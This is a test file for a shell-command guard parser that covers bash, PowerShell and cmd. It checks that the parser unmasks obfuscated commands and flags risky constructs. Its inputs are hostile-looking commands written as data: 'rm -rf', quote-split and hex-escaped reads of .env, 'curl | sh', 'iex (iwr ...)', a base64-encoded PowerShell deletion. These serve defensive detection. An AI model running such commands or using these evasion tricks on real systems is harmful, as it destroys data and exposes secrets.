import { describe, expect, it } from 'vitest';
import { parseShell } from '../src/guard/shell/index.js';
import type { Dialect } from '../src/guard/types.js';

const ctx = { vars: { HOME: '/home/u', PROJECT_DIR: '/proj' }, cwd: '/proj', platform: 'posix' as const };

function parse(cmd: string, dialect: Dialect = 'bash') {
  return parseShell(cmd, dialect, ctx);
}
function sig(cmd: string, dialect: Dialect = 'bash'): string[] {
  return parse(cmd, dialect).commands.map((c) => [c.name, ...c.args.map((a) => a.value)].join(' '));
}
function reasons(cmd: string, dialect: Dialect = 'bash'): string[] {
  return parse(cmd, dialect).unresolved.filter((u) => u.severity === 'deny').map((u) => u.reason);
}

describe('bash parser', () => {
  it('splits sequences, pipes and lists', () => {
    expect(sig('ls -la && echo hi; cat a | grep b || true')).toEqual(['ls -la', 'echo hi', 'cat a', 'grep b', 'true']);
  });

  it('resolves quoting tricks', () => {
    expect(sig('r""m -rf x')).toEqual(['rm -rf x']);
    expect(sig('\\rm -rf x')).toEqual(['rm -rf x']);
    expect(sig('cat .e""nv')).toEqual(['cat .env']);
    expect(sig("cat '.en'v")).toEqual(['cat .env']);
    expect(sig("cat $'\\x2eenv'")).toEqual(['cat .env']);
  });

  it('normalizes command names', () => {
    expect(sig('/bin/rm -rf x')).toEqual(['rm -rf x']);
    expect(sig('python3.11 -c "print(1)"')[0]).toBe('python -c print(1)');
  });

  it('finds commands inside substitutions and subshells', () => {
    expect(sig('echo $(rm -rf x)')).toContain('rm -rf x');
    expect(sig('echo `rm -rf x`')).toContain('rm -rf x');
    expect(sig('(cd a && rm b)')).toEqual(expect.arrayContaining(['cd a', 'rm b']));
  });

  it('unwraps wrappers', () => {
    expect(sig('sudo -u root rm -rf x')).toEqual(['rm -rf x']);
    expect(sig('env FOO=1 rm x')).toEqual(['rm x']);
    expect(sig('nohup timeout 5 rm x')).toEqual(['rm x']);
    expect(sig('command rm x')).toEqual(['rm x']);
    expect(sig('sh -c "rm -rf x"')).toEqual(['rm -rf x']);
    expect(sig("bash -lc 'git status && rm x'")).toEqual(['git status', 'rm x']);
    expect(sig('xargs -0 rm')).toEqual(['rm']);
    expect(sig('find . -name x -exec rm {} \\;')).toEqual(expect.arrayContaining(['rm {}']));
    expect(sig('npx --yes prisma migrate dev')).toEqual(['prisma migrate dev']);
    expect(sig('npx -y @scope/pkg@1.2.3 run')).toEqual(['pkg run']);
  });

  it('flags unresolvable constructs', () => {
    expect(reasons('$CMD x')).toContain('dynamic-command');
    expect(reasons('eval "rm x"')).toContain('eval');
    expect(reasons('source ./x.sh')).toContain('source');
    expect(reasons('curl http://x | sh')).toContain('pipe-to-shell');
    expect(reasons('echo "unterminated')).toContain('parse-error');
  });

  it('tracks redirects and heredocs', () => {
    const r = parse('cat > out.txt <<EOF\nDROP TABLE users;\nEOF');
    expect(r.commands[0]?.redirects[0]?.target?.value).toBe('out.txt');
    expect(r.text.join('\n')).toContain('DROP TABLE');
    expect(parse('echo hi 2>&1 >/dev/null').commands[0]?.redirects.map((x) => x.target?.value)).toEqual(['/dev/null']);
  });

  it('substitutes known variables only', () => {
    expect(sig('cat $HOME/x')).toEqual(['cat /home/u/x']);
    expect(parse('cat $UNKNOWN/x').commands[0]?.args[0]?.dynamic).toBe(true);
  });

  it('extracts inline interpreter code', () => {
    const r = parse(`node -e "require('fs').rmSync('x')"`);
    expect(r.commands[0]?.inline[0]?.lang).toBe('node');
    expect(r.commands[0]?.inline[0]?.code).toContain('rmSync');
  });

  it('handles env assignments and keywords', () => {
    expect(sig('FOO=1 BAR=2 git status')).toEqual(['git status']);
    expect(sig('if true; then rm x; fi')).toEqual(expect.arrayContaining(['true', 'rm x']));
  });
});

describe('powershell parser', () => {
  it('parses cmdlets and aliases', () => {
    expect(sig('Remove-Item -Recurse -Force .\\build', 'powershell')).toEqual(['remove-item -Recurse -Force .\\build']);
    expect(sig('ri x; del y', 'powershell')).toEqual(['ri x', 'del y']);
  });

  it('reads commands inside script blocks and subexpressions', () => {
    expect(sig('Get-ChildItem | ForEach-Object { Remove-Item $_.FullName }', 'powershell')).toEqual(expect.arrayContaining(['remove-item $_.FullName']));
    expect(sig('(Get-Content .env).Length', 'powershell')).toEqual(expect.arrayContaining(['get-content .env']));
  });

  it('flags dynamic and encoded commands', () => {
    expect(reasons('& $cmd x', 'powershell')).toContain('dynamic-command');
    expect(reasons('iex (iwr http://x)', 'powershell')).toContain('invoke-expression');
    const enc = Buffer.from('Remove-Item x', 'utf16le').toString('base64');
    expect(sig(`powershell -EncodedCommand ${enc}`, 'powershell')).toEqual(['remove-item x']);
  });

  it('unwraps nested shells', () => {
    expect(sig('cmd /c "del x"', 'powershell')).toEqual(['del x']);
    expect(sig('powershell -NoProfile -Command "rm x"', 'powershell')).toEqual(['rm x']);
  });

  it('captures .NET static calls as inline code', () => {
    const r = parse("[System.IO.File]::Delete('a.txt')", 'powershell');
    expect(r.commands[0]?.inline[0]?.code).toContain('Delete');
  });
});

describe('cmd parser', () => {
  it('parses cmd commands', () => {
    expect(sig('del /q x.txt & rd /s /q build', 'cmd')).toEqual(['del /q x.txt', 'rd /s /q build']);
    expect(sig('@echo off && if exist x del x', 'cmd')).toEqual(expect.arrayContaining(['echo off', 'del x']));
  });

  it('flags dynamic variables', () => {
    expect(parse('del %FOO%\\x', 'cmd').commands[0]?.args[0]?.dynamic).toBe(true);
  });
});
